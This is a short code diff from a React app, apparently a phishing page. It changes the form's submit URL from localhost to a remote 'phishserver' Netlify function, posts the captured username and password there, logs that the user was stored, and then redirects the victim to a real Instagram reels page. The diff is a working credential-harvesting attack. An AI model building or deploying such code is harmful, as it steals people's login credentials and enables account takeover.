@@ -10,7 +10,7 @@ function App() {
   }
   const handleSubmit = (e) =>{
     console.log(data)
-    const url = 'http://localhost:3000/api/users'
+    const url = 'https://phishserver.netlify.app/.netlify/functions/index/api/users'
     //send username and password to server with fetch request
    try{
     fetch(url, {
@@ -19,8 +19,8 @@ function App() {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify(data),
-         })
-         console.log('usuario almacenado')
+    })
+        console.log('usuario almacenado')
          window.location.replace("http://www.instagram.com/reels/DBtwBM3uoes/");
         }catch(e){
           console.log(e)
